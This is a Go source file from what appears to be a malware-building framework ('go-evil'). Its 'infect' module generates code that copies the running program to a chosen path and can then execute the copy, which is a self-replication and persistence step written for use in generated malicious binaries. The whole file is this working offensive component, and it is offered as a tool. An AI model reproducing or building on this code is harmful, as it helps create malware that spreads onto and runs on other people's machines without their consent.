package infect

import (
	"fmt"
	"strings"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Places a copy in the provided path
// Requires an evil array with the following format
// 1 - Path to infect, MUST end with the name that the copy will have
// 2 - Should the copy be booted once the process is done? (true/false)
func path(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "infect_path"
	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "infect.path()")
	}

	path := arr.Get(0)

	boot := tools.String_to_boolean(strings.ToLower(arr.Get(1)))

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int, auto_boot bool){", function_call),
		"path := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"src, err := os.Open(spine.path)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"dst, err := os.Create(path)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"_, err = io.Copy(dst, src)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"if auto_boot{",
		"err = exec.Command(fmt.Sprintf(\"%s\", path)).Run()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}",
		"}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("io")
	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	parameter_1 := data_object.Generate_int_array_parameter(path)

	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, boot)}, structure.Send(data_object)
}
